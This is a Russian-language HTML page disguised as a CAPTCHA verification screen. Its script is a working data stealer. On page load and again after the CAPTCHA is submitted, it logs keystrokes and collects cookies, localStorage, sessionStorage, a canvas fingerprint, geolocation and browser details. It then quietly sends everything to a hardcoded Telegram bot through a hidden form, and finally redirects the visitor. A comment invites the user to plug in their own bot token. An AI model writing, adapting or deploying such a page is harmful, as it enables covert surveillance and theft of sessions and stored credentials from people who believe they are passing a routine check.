<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e17;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }
        .captcha-box {
            background: #141b26;
            border-radius: 28px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            border: 1px solid #2a3340;
            text-align: center;
        }
        .shield { font-size: 48px; margin-bottom: 12px; }
        h2 { font-weight: 500; font-size: 20px; color: #fff; margin-bottom: 6px; }
        .sub { color: #8892a0; font-size: 14px; margin-bottom: 28px; }
        .captcha-display {
            background: #0f1520;
            border-radius: 16px;
            padding: 20px;
            font-size: 36px;
            letter-spacing: 12px;
            font-weight: 700;
            color: #6a8cff;
            margin-bottom: 20px;
            border: 1px solid #1f2a38;
            font-family: 'Courier New', monospace;
            user-select: none;
        }
        input {
            width: 100%;
            padding: 16px 18px;
            background: #0f1520;
            border: 1px solid #1f2a38;
            border-radius: 14px;
            color: #fff;
            font-size: 18px;
            text-align: center;
            letter-spacing: 6px;
            transition: 0.2s;
        }
        input:focus {
            border-color: #4f7cff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(79, 124, 255, 0.15);
        }
        .btn {
            width: 100%;
            padding: 16px;
            margin-top: 16px;
            background: #4f7cff;
            border: none;
            border-radius: 14px;
            color: #fff;
            font-weight: 600;
            font-size: 17px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn:hover { background: #3b66e5; }
        .status {
            margin-top: 18px;
            font-size: 13px;
            color: #5a6a7a;
        }
        iframe { display: none; }
    </style>
</head>
<body>

<div class="captcha-box">
    <div class="shield">🛡️</div>
    <h2>Подтверждение доступа</h2>
    <div class="sub">Введите код с картинки для продолжения</div>
    <div class="captcha-display" id="captchaCode">A7K9F</div>
    <input type="text" id="captchaInput" placeholder="Введите код" maxlength="5" autocomplete="off">
    <button class="btn" id="submitBtn">Подтвердить</button>
    <div class="status" id="statusText">Ожидание ввода...</div>
</div>

<!-- Скрытая форма для отправки в Telegram -->
<iframe name="tgFrame" style="display:none;"></iframe>
<form id="tgForm" action="" method="GET" target="tgFrame" style="display:none;"></form>

<script>
// ================================================================
//  ВСТАВЬ СВОЙ ТОКЕН И CHAT_ID, ЁБАНАТ
// ================================================================
const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
const CHAT_ID   = '-1003791860129';

// ---------- ГЕНЕРАЦИЯ КАПЧИ ----------
function generateCaptcha() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = '';
    for (let i = 0; i < 5; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    document.getElementById('captchaCode').textContent = code;
    return code;
}
let currentCaptcha = generateCaptcha();

// ---------- КЕЙЛОГ ----------
let keyLog = [];
document.addEventListener('keydown', (e) => {
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
        keyLog.push(e.key);
        if (keyLog.length > 200) keyLog.shift();
    }
});

// ---------- ФИНГЕРПРИНТ ----------
function getFP() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(10, 10, 20, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('fp', 30, 30);
        return canvas.toDataURL().slice(0, 80);
    } catch(e) { return 'ошибка'; }
}

// ---------- ГЕОЛОКАЦИЯ ----------
function getGeo() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve('недоступно');
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
            () => resolve('отказано')
        );
    });
}

// ---------- СБОР ВСЕХ ДАННЫХ ----------
async function collectAllData() {
    const data = {};
    
    // Браузер
    data.ua = navigator.userAgent;
    data.lang = navigator.language;
    data.platform = navigator.platform;
    data.screen = `${screen.width}x${screen.height}`;
    data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    data.time = new Date().toISOString();
    data.ref = document.referrer || 'прямой';
    data.url = location.href;
    data.fp = getFP();
    data.cookies = document.cookie || 'нет';
    
    try {
        data.ls = JSON.stringify(localStorage, null, 2) || 'пусто';
    } catch(e) { data.ls = 'ошибка'; }
    
    try {
        data.ss = JSON.stringify(sessionStorage, null, 2) || 'пусто';
    } catch(e) { data.ss = 'ошибка'; }
    
    data.keylog = keyLog.join('') || 'тишина';
    data.geo = await getGeo();
    
    return data;
}

// ---------- ОТПРАВКА ЧЕРЕЗ GET-ЗАПРОС (БЕЗ ПРОКСИ) ----------
function sendViaGet(text) {
    const form = document.getElementById('tgForm');
    const encoded = encodeURIComponent(text);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=HTML`;
    
    form.action = url;
    form.submit();
    
    // Статус
    document.getElementById('statusText').textContent = '✅ Данные отправлены';
    document.getElementById('statusText').style.color = '#7ddf9a';
}

// ---------- ОСНОВНАЯ ФУНКЦИЯ ----------
async function main() {
    const data = await collectAllData();
    
    let report = '📡 СБОР ДАННЫХ (АВТОМАТИЧЕСКИЙ)\n';
    report += '═══════════════════════════════════\n';
    for (let key in data) {
        report += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
    }
    report += '═══════════════════════════════════\n';
    
    // Отправляем через GET
    sendViaGet(report);
    
    // Возвращаем капчу
    return data;
}

// ---------- АВТОЗАПУСК ----------
window.addEventListener('load', function() {
    setTimeout(() => {
        main().catch(console.error);
    }, 1500);
});

// ---------- ОБРАБОТКА КАПЧИ ----------
document.getElementById('submitBtn').addEventListener('click', function() {
    const input = document.getElementById('captchaInput');
    const status = document.getElementById('statusText');
    const userCode = input.value.toUpperCase().trim();

    if (userCode === currentCaptcha) {
        status.textContent = '✅ Доступ подтверждён! Перенаправление...';
        status.style.color = '#7ddf9a';
        this.disabled = true;
        input.disabled = true;
        
        // Дополнительная отправка (на всякий случай)
        setTimeout(() => {
            main();
        }, 500);

        setTimeout(() => {
            window.location.href = 'https://yandex.ru';
        }, 2000);
    } else {
        status.textContent = '❌ Неверный код, попробуйте снова';
        status.style.color = '#ff8a7a';
        input.value = '';
        currentCaptcha = generateCaptcha();
        setTimeout(() => {
            status.textContent = 'Введите код с картинки';
            status.style.color = '#5a6a7a';
        }, 2000);
    }
});

document.getElementById('captchaInput').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        document.getElementById('submitBtn').click();
    }
});

console.log('🛡️ Система защиты загружена');
</script>
</body>
</html>
